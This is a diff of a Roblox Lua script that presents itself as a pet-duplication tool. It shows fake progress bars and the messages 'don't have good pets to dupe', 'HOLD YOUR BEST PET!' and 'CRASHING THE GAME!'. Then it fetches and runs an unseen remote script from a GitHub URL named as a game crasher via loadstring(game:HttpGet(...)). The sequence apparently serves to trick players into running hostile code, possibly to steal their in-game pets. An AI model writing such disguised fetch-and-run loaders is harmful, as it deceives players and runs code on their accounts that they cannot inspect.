@@ -1,11 +1,8 @@
--- Roblox GUI: 30s Animated Loader + Custom Phrase + Script Execution
--- Executes GitHub script after delay
--- Shows "FAILED - don't have good pets to dupe" at end
-
 local player = game.Players.LocalPlayer
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+local gui = Instance.new("ScreenGui")
 gui.Name = "BugTeleportUI"
 gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
 -- Frame
 local frame = Instance.new("Frame", gui)
@@ -25,7 +22,7 @@ title.BackgroundTransparency = 1
 title.Font = Enum.Font.SourceSansBold
 title.TextScaled = true
 
--- Loading Bar Background
+-- Bar Background
 local barBg = Instance.new("Frame", frame)
 barBg.Size = UDim2.new(0.9, 0, 0.2, 0)
 barBg.Position = UDim2.new(0.05, 0, 0.4, 0)
@@ -33,7 +30,7 @@ barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
 barBg.BorderSizePixel = 0
 barBg.ClipsDescendants = true
 
--- Loading Bar Fill
+-- Bar Fill
 local barFill = Instance.new("Frame", barBg)
 barFill.Size = UDim2.new(0, 0, 1, 0)
 barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
@@ -66,25 +63,45 @@ pumpkin.Position = UDim2.new(0.75, 0, -0.3, 0)
 pumpkin.Image = "rbxassetid://11799845832"
 pumpkin.BackgroundTransparency = 1
 
--- Animate loading for 30 seconds (300 steps)
-task.spawn(function()
-	for i = 1, 300 do
-		barFill.Size = UDim2.new(i / 300, 0, 1, 0)
-		wait(0.1) -- 0.1s * 300 = 30 seconds total
+-- Function to animate progress bar
+local function animateBar(duration, color)
+	barFill.Size = UDim2.new(0, 0, 1, 0)
+	barFill.BackgroundColor3 = color or Color3.fromRGB(0, 170, 255)
+	local steps = 100
+	local interval = duration / steps
+	for i = 1, steps do
+		barFill.Size = UDim2.new(i / steps, 0, 1, 0)
+		wait(interval)
 	end
+end
 
-	-- After loading
+-- Run full sequence
+task.spawn(function()
+	-- PHASE 1: 30s Load
+	animateBar(30, Color3.fromRGB(0, 170, 255))
 	loading.Text = "FAILED"
 	footer.Text = "don't have good pets to dupe 😔"
+	wait(2)
 
-	wait(2) -- Short delay before running
+	-- PHASE 2: 10s Fast Load
+	animateBar(10, Color3.fromRGB(255, 170, 0))
+	loading.Text = "HOLD YOUR BEST PET!"
+	footer.Text = ""
+	wait(5)
 
-	-- Execute the GitHub script
+	-- PHASE 3: Final Trigger
+	loading.Text = "CRASHING THE GAME!"
+	footer.Text = ""
+
+	wait(2)
+
+	-- Execute GitHub script
 	local success, err = pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/ReiX31/Crash-gag/refs/heads/main/Reirei"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ReiX31/Gag-crasher.2/refs/heads/main/RYUK-GAMECRASHER"))()
 	end)
 
 	if not success then
-		warn("Script failed to run: " .. tostring(err))
+		footer.Text = "FAILED TO EXECUTE"
+		warn("Error: " .. tostring(err))
 	end
 end)
